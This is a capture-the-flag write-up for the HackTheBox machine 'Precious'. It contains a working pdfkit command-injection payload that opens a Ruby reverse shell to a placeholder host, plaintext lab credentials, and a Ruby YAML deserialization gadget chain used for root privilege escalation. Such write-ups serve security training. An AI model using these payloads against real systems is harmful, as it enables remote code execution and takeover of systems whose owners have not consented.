## [Precious](https://app.hackthebox.com/machines/Precious) - 11/04/2023 - HackTheBox write-up

### User flag

#### Discovery

With a `nmap` we can find the following informations:
```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

On the HTTP server we can find a webpage who can convert a web page to a PDF by typing an URL.

It doesn't work with a remote URL so we have to try it on a local server.

With Python:
```bash
python -m http.server
```

And then, we can obtain a PDF with the URL: `http://LOCAL-IP:8000/`.

#### Search for vulnerability

After obtaining the PDF we can see in the EXIF data that it's generated with `pdfkit` (v0.8.6).

With a quick research on the Web, we found that this library is vulnerable to a RCE. We can easily initiate a reverse shell with the correct payload in the URL ([link](https://nvd.nist.gov/vuln/detail/CVE-2022-25765)).

#### Exploitation

An exploit is available [here](https://awesomeopensource.com/project/CyberArchitect1/CVE-2022-25765-pdfkit-Exploit-Reverse-Shell), we just have to type those 3 commands :
```bash
$ python -m http.server     # Local HTTP port :      8000 (default)
$ nc -nlvp 4444             # Local listening port : 4444
$ curl 'http://precious.htb' -X POST --data-raw 'url=http://LOCAL-IP:LOCAL-HTTP-PORT/?name=%20`+ruby+-rsocket+-e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("LOCAL-IP",LOCAL-LISTEN-PORT))'`'
```

Now we are connected to the server with a reverse shell as the `ruby` user. This user doesn't have much privileges, but we can find in his `/home` a file : `.bundle/config`.

In this we can find the creds of our first user : `henry:Q3c1AqGHtoI0aXAYFH`. With this we can connect with SSH and get the user flag.

### Root flag

#### Search for vulnerability

Now we need to find the root flag to own the system. With our user we can find interesting things with a `sudo -l`:
```bash
User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

We can run this command as root with the user `henry`. Now if we look at this file `/opt/update_dependencies.rb`,
we can see the program use a function to read a YAML file :
```ruby
YAML.load(File.read("dependencies.yml"))
```

This function `YAML.load()` is vulnerable and we can use it to execute commands via deserialization (see [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md)).

#### Exploitation

Ruby version is 2.7.4 so we need to use the second gadget to execute commands. With this exploit we can write in our directory the file `dependencies.yml` :
```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: cat /root/root.txt    # command here
         method_id: :resolve
```

Now by typing:
```bash
sudo /usr/bin/ruby /opt/update_dependencies.rb
```
we can execute the command as root and see the flag.
